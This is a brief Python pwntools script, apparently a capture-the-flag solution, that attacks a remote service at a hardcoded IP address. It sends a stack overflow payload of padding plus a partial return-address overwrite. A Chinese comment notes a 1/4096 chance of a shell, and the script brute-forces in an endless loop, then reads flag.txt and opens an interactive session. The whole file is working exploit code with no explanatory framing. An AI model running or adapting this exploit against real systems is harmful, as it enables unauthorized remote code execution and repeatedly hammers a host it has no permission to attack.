from pwn import *
def exploit():
    p = remote('139.155.83.108',10002)

    p.recvuntil("searching on baidu and learn how to exploit it")

    p.sendline('aaaa')

    p.recvuntil('aaaa')

    #gdb.attach(p,'b vulunable')
    
    # 修改返回地址最低字节，然后爆破。1/4096的概率出shell
    filling = b'a' * 0x200
    payload = filling + b'a'*8 + b'\xc1\x08'
    p.sendline(payload)
    p.recv()
    p.sendline("cat flag.txt")
    result = p.recv(timeout=1)

    p.interactive()

if __name__ == '__main__':
    try_count = 0
    while(True):
        try:
            exploit()
        except:
            try_count += 1
            print("failed :{}".format(try_count))